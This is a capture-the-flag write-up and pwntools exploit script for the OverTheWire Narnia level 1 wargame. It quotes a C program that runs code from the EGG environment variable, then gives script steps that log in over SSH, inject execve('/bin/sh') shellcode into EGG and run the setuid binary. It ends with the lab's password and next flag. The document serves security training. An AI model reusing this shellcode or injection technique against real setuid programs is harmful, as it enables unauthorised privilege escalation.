'''
OverTheWire
Narnia Level1
Jake Mai

Source Code:

************************************************************************
#include <stdio.h>

int main(){
    int (*ret)();

    if(getenv("EGG")==NULL){
        printf("Give me something to execute at the env-variable EGG\n");
        exit(1);
    }

    printf("Trying to execute EGG!\n");
    ret = getenv("EGG");
    ret();

    return 0;
}

************************************************************************
getenv function returns the directory structure of the env var
Seems like we need to inject shellcode in the EGG env var

'''
# Exploit

from pwn import *
import os
def pwn():
    shesh=ssh(host="narnia.labs.overthewire.org",
            user="narnia1",
            password="efeidiedae",
            port=2226)

    lego=shesh.process('/bin/sh')
    lego.sendline("export EGG=$'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80'")
    lego.sendline('/narnia/narnia1')
    lego.interactive()

if __name__ == "__main__":
    pwn()

# My script does not work for some reason? Sucessfully changed the EGG env but could not escalte to narnia2 user
# But when ssh to the server and export EGG=$'shellcode' manually it worked??
# Flag: nairiepecu
